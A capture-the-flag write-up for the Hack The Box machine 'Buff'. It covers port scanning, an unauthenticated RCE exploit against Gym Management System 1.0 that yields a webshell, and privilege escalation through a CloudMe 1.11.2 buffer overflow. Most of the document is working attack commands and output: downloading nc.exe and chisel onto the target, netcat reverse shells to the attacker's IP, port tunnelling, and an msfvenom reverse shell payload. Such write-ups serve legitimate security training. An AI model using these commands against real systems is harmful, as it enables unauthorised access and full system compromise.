# Buff @ 10.10.10.198

## Enumeration

A port scan with OS detection and script scanning reveals that port 8080 is open, most likely on Windows 7.

```bash
$ sudo nmap -v -A -Pn 10.10.10.198
...
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
...
Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
...
```

On the contact page (<http://10.10.10.198:8080/contact.php>) the site reveals that it is made using *Gym Management Software 1.0*.

## Exploitation

A quick search with searchsploit shows that there are multiple exploits available for Gym Management System 1.0. Not exactly the same name, but most likely it is the same. Let's try.

```bash
$ searchsploit Gym Management         
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Gym Management System 1.0 - 'id' SQL Injection                                                                        | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                                                                     | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                                                               | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution                                                     | php/webapps/48506.py
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

First try the RCE exploit.

```bash
$ searchsploit -m 48506      
  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
...
```

Reading the content of the exploit shows that the upload.php file of the management system is vulnerable. Verify that it is present on the server

```bash
$ curl http://10.10.10.198:8080/upload.php
<br />
<b>Notice</b>:  Undefined index: id in <b>C:\xampp\htdocs\gym\upload.php</b> on line <b>4</b><br />
```

It is present indeed, including an error. The exploit mentions it's usage `Usage:\t python %s <WEBAPP_URL>`. It also needs the colorama module.

```
$ pip install colorama
...
Successfully installed colorama-0.4.4
$ python 48506.py 'http://10.10.10.198:8080/'
            /\
/vvvvvvvvvvvv \--------------------------------------,                                                                                                  
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG
▒
buff\shaun

C:\xampp\htdocs\gym\upload> 
```

Success! Access as user shaun. Proof can be obtained with

```console
C:\xampp\htdocs\gym\upload> type c:\users\shaun\desktop\user.txt
```

User Shaun is not an administrator user. Therefore additional enumeration is needed to find a way to escalate privileges. The obtained shell is not a fully functional one.  The first step is to upgrade it.

## Upgrade shell

Start a webserver to host a netcat executable (nc.exe) and start a netcat listener.

```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

$ nc -nlvp 4444
listening on [any] 4444 ...
```

And download it using powershell or certutil

```cmd
C:\xampp\htdocs\gym\upload> powershell iwr http://10.10.14.16/nc.exe -out nc.exe -useb
C:\xampp\htdocs\gym\upload> nc.exe 10.10.14.16 4444 -e powershell
```

This will result in a proper powershell

```
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.198] 49759
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\gym\upload> 
```

## Enumeration part 2

List the network connections with netstat, to find those that are not visible to the outside world.

```
PS C:\> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       952
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5748
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       8084
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       2928
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       524
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       972
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1428
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2204
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       668
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       684
  TCP    10.10.10.198:139       0.0.0.0:0              LISTENING       4
  TCP    10.10.10.198:8080      10.10.14.16:33170      ESTABLISHED     2928
  TCP    10.10.10.198:49759     10.10.14.16:4444       ESTABLISHED     8520
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       8008
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       7140
...
```

Note that port 3306 and 8888 are listening on the loopback interface. The first one is most likely mysql, the second one could be anything.

Lists running processes with `Get-Process` (or `tasklist /svc`)

```
PS C:\xampp\htdocs\gym\upload> get-process
get-process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
    438      24    17860       8816              6984   1 ApplicationFrameHost                                         
    161      10     1912       1744              3492   1 browser_broker                                               
    330      23    32364      37488              5996   0 CloudMe     
...
```

A CloudMe process is running. Searching for the executable reveals the following file in the downloads folder of Shaun

```powershell
PS C:\users\shaun\Downloads> dir
dir


    Directory: C:\users\shaun\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       16/06/2020     16:26       17830824 CloudMe_1112.exe                                                      
```

There are multiple exploits available for CloudMe version 1.11.2

```bash
$ searchsploit cloudme   
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                                                                | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                                                       | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                                                       | windows/local/48840.py
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                                                      | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                                                               | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                                                        | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                                                           | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                                                       | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                                                              | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow                                                                               | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                                                            | windows_x86-64/remote/44784.py
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

A quick search on the internet reveals that port 8888 is the default port for CloudMe.

## Privilege escalation

To be able to interact with the CloudMe service from Kali, the local port has to be forwarded to the Kali box. In this case, using chisel <https://github.com/jpillora/chisel>.

1. Start a chisel server
2. Upload chisel executable to the target
3. Start a chisel client and forward port 8888 to Kali

```bash
# Start the chisel server 
$ sudo chisel/1.7.3/chiselx64 server -p 3636 -reverse
server: Listening on http://0.0.0.0:3636
```

```bash
# Transfer chisel the box using the http server
PS C:\xampp\htdocs\gym\upload> iwr http://10.10.14.16/chisel/1.7.3/chisel64.exe -out chisel.exe -useb

# Connect the chisel client
PS C:\xampp\htdocs\gym\upload> start-process "chisel.exe" "client 10.10.14.16:3636 R:8888:127.0.0.1:8888"
```

And the connection will arrive

```bash
server: Listening on http://0.0.0.0:3636
server: session#1: tun: proxy#R:8888=>8888: Listening
```

Try exploit number 48389.

```bash
$ searchsploit -m 48389
  Exploit: CloudMe 1.11.2 - Buffer Overflow (PoC)
...

Studying the exploit code shows that the payload needs to be replaced if we want more than to start the calculator. Replace the payload with the output from msfvenom. Line 20 shows that the bad characters are '\x00\x0A\x0D' and line 39 shows that the total size must be limited to 1500 characters. That should be more than enough space for a simple reverse shell. Note that the target is already right, as the localhost port 8888 is forwarded to the target.

```bash
# Create the payload
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=5555 EXITFUNC=thread -b "\x00\x0d\x0a" -f python -v payload
```

Copy the payload in the exploit script and save it. Finally start a netcat listener and run the exploit. 

```bash
# Exploit
$ python3 48389.py

# Netcat listener in a second terminal
$ nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.198] 49765
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
buff\administrator

C:\Windows\system32>
```

I might take multiple tries. This exploit crashes the CloudMe process and is not always successful. In that case, reset the box, wait for the process to recover or try to start it manually with `start-process cloudme_1112.exe -windowstyle hidden`.

Proof is available with

```cmd
type c:\Users\Administrator\Desktop\root.txt
```